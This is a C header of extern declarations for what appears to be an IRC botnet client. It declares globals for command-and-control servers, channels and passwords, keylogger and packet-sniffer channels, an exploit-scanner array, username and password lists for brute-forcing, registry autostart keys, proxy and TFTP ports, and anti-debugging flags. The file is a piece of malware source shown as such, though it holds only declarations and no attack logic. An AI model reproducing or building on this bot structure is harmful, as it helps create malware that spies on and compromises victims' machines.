// config extern globals for module use

extern char botid[];
extern char version[];
extern char password[];
extern char rmpassword[];
extern char server[];
extern unsigned short port;
extern char serverpass[];
extern char channel[];
extern char chanpass[];
extern char server2[];
extern char channel2[];
extern char chanpass2[];
extern char filename[];
extern char keylogfile[];
extern char valuename[];
extern char nickconst[]; 
extern char szLocalPayloadFile[];
extern char modeonconn[];
extern char exploitchan[];
extern char keylogchan[];
extern char psniffchan[];
extern char *authnick[];
extern char *versionlist[];
extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];
extern char regkey5[];

extern unsigned short socks4port;
extern unsigned short tftpport;
extern unsigned short httpport;
extern unsigned short rloginport;

extern bool topiccmd;
extern bool rndfilename;
extern bool AutoStart;

extern char prefix;

extern int maxrand;
extern int nicktype;
extern bool nickprefix;

// global threads
extern THREAD threads[MAXTHREADS];

// url visit function
extern HANDLE ih;

// aliases
extern ALIAS aliases[MAXALIASES];
extern int anum;

// passwords
extern char *usernames[];
extern char *passwords[];

// advscan
extern EXPLOIT exploit[];

// misc
extern DWORD started;

#ifdef DEBUG_LOGGING
extern char logfile[];
#endif

#ifdef PLAIN_CRYPT
extern char key[];
#endif

#ifndef NO_ANTIDEBUG
extern char message[];
#endif
